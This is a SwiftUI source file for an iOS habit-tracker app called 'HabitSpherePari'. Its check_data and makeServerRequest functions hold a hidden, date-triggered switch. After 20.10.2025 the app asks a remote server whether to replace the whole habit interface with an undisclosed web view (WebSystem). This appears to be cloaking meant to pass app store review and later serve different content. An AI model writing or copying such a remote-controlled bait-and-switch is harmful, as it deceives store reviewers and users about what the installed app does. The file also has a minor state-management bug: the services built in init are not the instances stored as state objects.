//
//  ContentView.swift
//  dafoma_68
//
//  Created by Вячеслав on 10/13/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @StateObject private var habitsService = HabitsService()
    @StateObject private var challengesService = ChallengesService()
    @StateObject private var analyticsService: AnalyticsService
    
    init() {
        let habitsService = HabitsService()
        let challengesService = ChallengesService()
        let analyticsService = AnalyticsService(habitsService: habitsService, challengesService: challengesService)
        
        self._analyticsService = StateObject(wrappedValue: analyticsService)
    }
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if hasCompletedOnboarding {
                            MainTabView()
                                .environmentObject(habitsService)
                                .environmentObject(challengesService)
                                .environmentObject(analyticsService)
                        } else {
                            OnboardingView()
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "20.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        // Дата в прошлом - делаем запрос на сервер
        makeServerRequest()
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                if let httpResponse = response as? HTTPURLResponse {
                    
                    if httpResponse.statusCode == 404 {
                        
                        self.isBlock = true
                        self.isFetched = true
                        
                    } else if httpResponse.statusCode == 200 {
                        
                        self.isBlock = false
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // В случае ошибки сети тоже блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

struct MainTabView: View {
    @EnvironmentObject var habitsService: HabitsService
    @EnvironmentObject var challengesService: ChallengesService
    @EnvironmentObject var analyticsService: AnalyticsService
    
    var body: some View {
        TabView {
            HabitTrackerView()
                .tabItem {
                    Image(systemName: "checkmark.circle.fill")
                    Text("Habits")
                }
            
            MindfulnessExercisesView()
                .tabItem {
                    Image(systemName: "leaf.fill")
                    Text("Mindfulness")
                }
            
            CommunityChallengesView()
                .tabItem {
                    Image(systemName: "person.2.fill")
                    Text("Challenges")
                }
            
            ProgressAnalyticsView()
                .tabItem {
                    Image(systemName: "chart.line.uptrend.xyaxis")
                    Text("Analytics")
                }
            
            SettingsView()
                .tabItem {
                    Image(systemName: "gear")
                    Text("Settings")
                }
        }
        .accentColor(Color(hex: "#F9FF14"))
        .background(Color(hex: "#050505"))
    }
}

struct SettingsView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @EnvironmentObject var habitsService: HabitsService
    @EnvironmentObject var challengesService: ChallengesService
    @State private var showingResetAlert = false
    @State private var showingDeleteAccountAlert = false
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "#050505")
                    .ignoresSafeArea()
                
                VStack(spacing: 0) {
                    // Header
                    VStack(spacing: 16) {
                        Image(systemName: "gear")
                            .font(.system(size: 50, weight: .light))
                            .foregroundColor(Color(hex: "#F9FF14"))
                        
                        Text("Settings")
                            .font(.system(size: 28, weight: .bold, design: .rounded))
                            .foregroundColor(.white)
                    }
                    .padding(.top, 20)
                    .padding(.bottom, 40)
                    
                    // Settings List
                    VStack(spacing: 16) {
                        SettingsRow(
                            icon: "arrow.clockwise",
                            title: "Reset All Data",
                            subtitle: "Clear all habits, challenges, and progress",
                            action: { showingResetAlert = true }
                        )
                        
                        SettingsRow(
                            icon: "person.crop.circle.badge.minus",
                            title: "Delete Account",
                            subtitle: "Reset to onboarding screen",
                            action: { showingDeleteAccountAlert = true }
                        )
                        
                        SettingsRow(
                            icon: "info.circle",
                            title: "About",
                            subtitle: "HabitSpherePari v1.0",
                            action: { }
                        )
                    }
                    .padding(.horizontal, 20)
                    
                    Spacer()
                }
            }
        }
        .alert("Reset All Data", isPresented: $showingResetAlert) {
            Button("Cancel", role: .cancel) { }
            Button("Reset", role: .destructive) {
                resetAllData()
            }
        } message: {
            Text("This will permanently delete all your habits, challenges, and progress. This action cannot be undone.")
        }
        .alert("Delete Account", isPresented: $showingDeleteAccountAlert) {
            Button("Cancel", role: .cancel) { }
            Button("Delete", role: .destructive) {
                deleteAccount()
            }
        } message: {
            Text("This will reset the app to the onboarding screen and clear all data.")
        }
    }
    
    private func resetAllData() {
        habitsService.resetAllData()
        challengesService.resetAllData()
    }
    
    private func deleteAccount() {
        resetAllData()
        hasCompletedOnboarding = false
    }
}

struct SettingsRow: View {
    let icon: String
    let title: String
    let subtitle: String
    let action: () -> Void
    
    var body: some View {
        Button(action: action) {
            HStack(spacing: 16) {
                Image(systemName: icon)
                    .font(.system(size: 20, weight: .medium))
                    .foregroundColor(Color(hex: "#F9FF14"))
                    .frame(width: 30)
                
                VStack(alignment: .leading, spacing: 4) {
                    Text(title)
                        .font(.system(size: 16, weight: .semibold))
                        .foregroundColor(.white)
                    
                    Text(subtitle)
                        .font(.system(size: 14, weight: .regular))
                        .foregroundColor(.white.opacity(0.7))
                }
                
                Spacer()
                
                Image(systemName: "chevron.right")
                    .font(.system(size: 14, weight: .medium))
                    .foregroundColor(.white.opacity(0.5))
            }
            .padding(.horizontal, 20)
            .padding(.vertical, 16)
            .background(Color.white.opacity(0.05))
            .cornerRadius(12)
        }
        .buttonStyle(PlainButtonStyle())
    }
}

#Preview {
    ContentView()
}
